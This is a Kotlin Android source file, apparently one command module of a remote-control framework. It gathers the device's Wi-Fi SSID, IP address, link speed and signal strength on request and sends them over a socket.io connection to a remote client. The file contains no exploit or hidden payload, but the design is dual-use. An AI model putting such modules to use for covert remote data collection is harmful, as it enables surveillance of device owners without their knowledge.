package com.remote.system

import android.content.Context
import android.net.ConnectivityManager
import android.net.LinkProperties
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.wifi.WifiManager
import android.os.Build
import android.util.Log
import org.json.JSONException
import org.json.JSONObject
import io.socket.client.Socket
import java.net.Inet4Address
import java.net.NetworkInterface

class WiFiInfoCommand(private val context: Context) : CommandHandler {
    private val tag = "WiFiInfoCommand"

    override fun execute(params: JSONObject, clientId: String, socket: Socket) {
        try {
            val response = JSONObject()
            val data = JSONObject()

            val connectivityManager =
                context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val wifiManager =
                context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager

            var isConnected = false
            var ssid = ""
            var ipAddress = ""
            var linkSpeed = 0
            var signalStrength = 0

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // Modern API approach for Android 10+
                val network = connectivityManager.activeNetwork
                val capabilities = connectivityManager.getNetworkCapabilities(network)
                val linkProperties = connectivityManager.getLinkProperties(network)

                isConnected = capabilities != null &&
                        capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)

                if (isConnected) {
                    // Get WiFi info using modern approach
                    // Get IP address from LinkProperties
                    linkProperties?.linkAddresses?.forEach { linkAddress ->
                        val address = linkAddress.address
                        if (address is Inet4Address && !address.isLoopbackAddress) {
                            ipAddress = address.hostAddress ?: ""
                        }
                    }

                    // For SSID on Android 10+, we still need to use WifiManager but with suppression
                    @Suppress("DEPRECATION")
                    val wifiInfo = wifiManager.connectionInfo
                    @Suppress("DEPRECATION")
                    ssid = wifiInfo.ssid.replace("\"", "")
                    @Suppress("DEPRECATION")
                    linkSpeed = wifiInfo.linkSpeed
                    @Suppress("DEPRECATION")
                    signalStrength = wifiInfo.rssi
                }
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                // API 23-28 approach
                val network = connectivityManager.activeNetwork
                val capabilities = connectivityManager.getNetworkCapabilities(network)

                isConnected = capabilities != null &&
                        capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)

                if (isConnected) {
                    // Use deprecated APIs with suppression for API 23-28
                    @Suppress("DEPRECATION")
                    val wifiInfo = wifiManager.connectionInfo
                    @Suppress("DEPRECATION")
                    ssid = wifiInfo.ssid.replace("\"", "")

                    // Get IP address from interfaces if possible
                    try {
                        val interfaces = NetworkInterface.getNetworkInterfaces()
                        while (interfaces.hasMoreElements()) {
                            val networkInterface = interfaces.nextElement()
                            if (networkInterface.name.startsWith("wlan")) {
                                val addresses = networkInterface.inetAddresses
                                while (addresses.hasMoreElements()) {
                                    val address = addresses.nextElement()
                                    if (address is Inet4Address && !address.isLoopbackAddress) {
                                        ipAddress = address.hostAddress
                                    }
                                }
                            }
                        }
                    } catch (e: Exception) {
                        // Fallback to deprecated method if interface listing fails
                        @Suppress("DEPRECATION")
                        ipAddress = intToIpAddress(wifiInfo.ipAddress)
                    }

                    @Suppress("DEPRECATION")
                    linkSpeed = wifiInfo.linkSpeed
                    @Suppress("DEPRECATION")
                    signalStrength = wifiInfo.rssi
                }
            } else {
                // Legacy approach for API 22 and below
                @Suppress("DEPRECATION")
                val networkInfo = connectivityManager.activeNetworkInfo
                @Suppress("DEPRECATION")
                isConnected = networkInfo != null &&
                        networkInfo.isConnected &&
                        networkInfo.type == ConnectivityManager.TYPE_WIFI

                if (isConnected) {
                    @Suppress("DEPRECATION")
                    val wifiInfo = wifiManager.connectionInfo
                    @Suppress("DEPRECATION")
                    ssid = wifiInfo.ssid.replace("\"", "")
                    @Suppress("DEPRECATION")
                    ipAddress = intToIpAddress(wifiInfo.ipAddress)
                    @Suppress("DEPRECATION")
                    linkSpeed = wifiInfo.linkSpeed
                    @Suppress("DEPRECATION")
                    signalStrength = wifiInfo.rssi
                }
            }

            data.put("connected", isConnected)
            data.put("ssid", ssid)
            data.put("ip_address", ipAddress)
            data.put("link_speed", linkSpeed)
            data.put("signal_strength", signalStrength)

            response.put("success", true)
            response.put("data", data)
            response.put("command", "get_wifi_info")
            response.put("clientId", clientId)

            socket.emit("command-response", response)
        } catch (e: Exception) {
            Log.e(tag, "Error creating WiFi info response", e)

            try {
                val errorResponse = JSONObject()
                errorResponse.put("success", false)
                errorResponse.put("error", "Failed to get WiFi info: ${e.message}")
                errorResponse.put("command", "get_wifi_info")
                errorResponse.put("clientId", clientId)
                socket.emit("command-response", errorResponse)
            } catch (ex: JSONException) {
                Log.e(tag, "Error sending error response", ex)
            }
        }
    }

    private fun intToIpAddress(ipAddress: Int): String {
        return String.format(
            "%d.%d.%d.%d",
            ipAddress and 0xff,
            ipAddress shr 8 and 0xff,
            ipAddress shr 16 and 0xff,
            ipAddress shr 24 and 0xff
        )
    }
}